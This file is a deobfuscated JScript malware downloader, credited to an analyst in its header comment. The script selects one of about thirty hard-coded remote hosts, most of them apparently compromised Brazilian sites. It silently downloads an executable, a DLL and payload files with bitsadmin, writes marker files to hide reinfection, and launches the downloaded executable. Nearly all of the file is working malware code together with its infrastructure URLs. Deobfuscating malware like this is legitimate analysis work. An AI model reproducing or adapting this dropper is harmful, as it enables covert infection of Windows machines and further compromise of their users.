/*
Untagged Malware | Unknown Origins
Deobfuscated By: Shaxowfall
*/
var MaliciousEndpoint;
var numberSelection;
var mutator;
var URLSelectionIncrementor;
var FileSysObj_clone = new ActiveXObject("Scripting.FileSystemObject");
var WSCShell = new ActiveXObject("WScript.Shell");
URLSelectionIncrementor = 6;
function runAs_bitsadmin(endpoint, data) {
  try {
    WSCShell.run("C:\\Windows\\System32\\bitsadmin.exe /transfer 66998576980 /priority foreground " + endpoint + " \"" + data + "\"", 0, true);
    return true;
  } catch (WGoLRwKUwZuBAGYNxeeAQ) {
    return false;
  }
}
function getTargetNumber(mutator) {
  var targetnum;
  targetnum = mutator + URLSelectionIncrementor;
  URLSelectionIncrementor = URLSelectionIncrementor + 1;
  return targetnum;
}
function ini(unused) {
  isFilePresent = false;
  numberSelection = getTargetNumber(0, 30);
  if (numberSelection == 0) {
    MaliciousEndpoint = "http://6noif8.carloscontabil.com/";
  }
  if (numberSelection == 1) {
    MaliciousEndpoint = "http://89anx.expressojca.com.br/";
  }
  if (numberSelection == 2) {
    MaliciousEndpoint = "http://dnaue2.centraltraducoes.com/";
  }
  if (numberSelection == 3) {
    MaliciousEndpoint = "http://83iaw7.posesexyshop.com.br/";
  }
  if (numberSelection == 4) {
    MaliciousEndpoint = "http://32uad4.vgercie.com/";
  }
  if (numberSelection == 5) {
    MaliciousEndpoint = "http://5yiafm.myhistoryfamily.com/";
  }
  if (numberSelection == 6) {
    MaliciousEndpoint = "http://1oa8w.posesexyshop.com.br/";
  }
  if (numberSelection == 7) {
    MaliciousEndpoint = "http://dnuae7.saolucascasaeconstrucao.com.br/";
  }
  if (numberSelection == 8) {
    MaliciousEndpoint = "http://aeeau2.proeleng.com.br/";
  }
  if (numberSelection == 9) {
    MaliciousEndpoint = "http://dweemw.r1tecnologiaemcorte.com.br/";
  }
  if (numberSelection == 10) {
    MaliciousEndpoint = "http://94oa6r.centraltraducoes.com/";
  }
  if (numberSelection == 11) {
    MaliciousEndpoint = "http://4uaa5y.pilarfilmes.com.br/";
  }
  if (numberSelection == 12) {
    MaliciousEndpoint = "http://cwuaad.resumoproducoes.com/";
  }
  if (numberSelection == 13) {
    MaliciousEndpoint = "http://7meoet.r1tecnologiaencorte.com.br/";
  }
  if (numberSelection == 14) {
    MaliciousEndpoint = "http://diue7.qualitreine.com.br/";
  }
  if (numberSelection == 15) {
    MaliciousEndpoint = "http://b8uuer.r1tecnologiaencorte.com.br/";
  }
  if (numberSelection == 16) {
    MaliciousEndpoint = "http://7vaor.centraldetraducciones.com/";
  }
  if (numberSelection == 17) {
    MaliciousEndpoint = "http://aruec.vallecort.com.br/";
  }
  if (numberSelection == 18) {
    MaliciousEndpoint = "http://7ruas8.icmpatriarca.com.br/";
  }
  if (numberSelection == 19) {
    MaliciousEndpoint = "http://ebao4l.vallecort.com.br/";
  }
  if (numberSelection == 20) {
    MaliciousEndpoint = "http://67ei6t.sysmaqengenharia.com/";
  }
  if (numberSelection == 21) {
    MaliciousEndpoint = "http://3yoa9h.archidoor.com.br/";
  }
  if (numberSelection == 22) {
    MaliciousEndpoint = "http://3wa9r.r1tecnologiaemcorte.com.br/";
  }
  if (numberSelection == 23) {
    MaliciousEndpoint = "http://7na7m.qualitreine.com.br/";
  }
  if (numberSelection == 24) {
    MaliciousEndpoint = "http://gdeuet.mourascorretoradeseguros.com.br/";
  }
  if (numberSelection == 25) {
    MaliciousEndpoint = "http://aoene.conplanner.com.br/";
  }
  if (numberSelection == 26) {
    MaliciousEndpoint = "http://74oa7w.cgrcombate.com/";
  }
  if (numberSelection == 27) {
    MaliciousEndpoint = "http://97iif8.saolucascasaeconstrucao.com.br/";
  }
  if (numberSelection == 28) {
    MaliciousEndpoint = "http://dfa13.construtorapillar.eng.br/";
  }
  if (numberSelection == 29) {
    MaliciousEndpoint = "http://3weu7j.resumoproducoes.com/";
  }
  if (numberSelection == 30) {
    MaliciousEndpoint = "http://7rew5.laserweldingsys.com/";
  }
  var FileSysObj = new ActiveXObject("Scripting.FileSystemObject");
  if (FileSysObj_clone.FileExists("C:\\Users\\Public\\Libraries\\eu")) {
    isFilePresent = true;
  }
  if (FileSysObj_clone.FileExists("C:\\Users\\Public\\Libraries\\ew")) {
    isFilePresent = true;
  }
  if (FileSysObj_clone.FileExists("C:\\Users\\Public\\Libraries\\ez")) {
    isFilePresent = true;
  }
  if (FileSysObj_clone.FileExists("C:\\Users\\Public\\Libraries\\fa")) {
    isFilePresent = true;
  }
  if (FileSysObj_clone.FileExists("C:\\Users\\Public\\Libraries\\fb")) {
    isFilePresent = true;
  }
  if (FileSysObj_clone.FileExists("C:\\Users\\Public\\Libraries\\fc")) {
    isFilePresent = true;
  }
  if (FileSysObj_clone.FileExists("C:\\Users\\Public\\Libraries\\fd")) {
    isFilePresent = true;
  }
  if (FileSysObj_clone.FileExists("C:\\Users\\Public\\Libraries\\fe")) {
    isFilePresent = true;
  }
  if (FileSysObj_clone.FileExists("C:\\Users\\Public\\Libraries\\ff")) {
    isFilePresent = true;
  }
  if (isFilePresent == false) {
    WSCShell.run("cmd /V /C \"echo C:\\TempData34948836530\\>C:\\Users\\Public\\Libraries\\ff\"&& exit", 0, true);
    isFilePresent = false;
    try {
      FileSysObj.CreateFolder("C:\\TempData34948836530\\");
    } catch (doNothing) {}
    WSCShell.run("C:\\Windows\\System32\\bitsadmin.exe /reset", 0, true);
    try {
      bitadmin_fireResponse = runAs_bitsadmin(MaliciousEndpoint + "?51182154289628760", "C:\\TempData34948836530\\ASRock.FPGA.07161.7269.530.exe");
    } catch (doNothing) {}
    try {
      bitadmin_fireResponse = runAs_bitsadmin(MaliciousEndpoint + "?34471801345632956", "C:\\TempData34948836530\\ASRock.FPGA.07161.7269.530.log");
    } catch (doNothing) {}
    try {
      bitadmin_fireResponse = runAs_bitsadmin(MaliciousEndpoint + "?72569958773639080", "C:\\TempData34948836530\\ASRock.FPGA.07161.7269.530dbl.log");
    } catch (doNothing) {}
    try {
      bitadmin_fireResponse = runAs_bitsadmin(MaliciousEndpoint + "?57988480946678059", "C:\\TempData34948836530\\sqlite3.dll");
    } catch (doNothing) {}
    try {
      bitadmin_fireResponse = runAs_bitsadmin(MaliciousEndpoint + "?33920340481693697", "C:\\TempData34948836530\\sdk.log");
    } catch (doNothing) {}
    try {
      bitadmin_fireResponse = runAs_bitsadmin(MaliciousEndpoint + "?43637352777613952", "C:\\TempData34948836530\\dump.log");
    } catch (doNothing) {}
    try {
      WSCShell.run("cmd /V /C \"echo ASRock.FPGA.07161.7269.530>C:\\TempData34948836530\\\\r1.log\"&& exit", 0, true);
    } catch (doNothing) {}
    try {
      WSCShell.run("cmd /V /C \"echo ASRock.FPGA.07161.7269.530>C:\\TempData34948836530\\\\r.log\"&& exit", 0, true);
    } catch (doNothing) {}
    if (FileSysObj_clone.FileExists("C:\\TempData34948836530\\ASRock.FPGA.07161.7269.530.exe")) {
      if (FileSysObj_clone.FileExists("C:\\TempData34948836530\\ASRock.FPGA.07161.7269.530.log")) {
        try {
          isFilePresent = true;
          WSCShell.run("C:\\TempData34948836530\\ASRock.FPGA.07161.7269.530.exe C:\\TempData34948836530\\ASRock.FPGA.07161.7269.530.log", 0, false);
        } catch (doNothing) {}
        isFilePresent = true;
      }
    }
  }
}
ini("74866294850");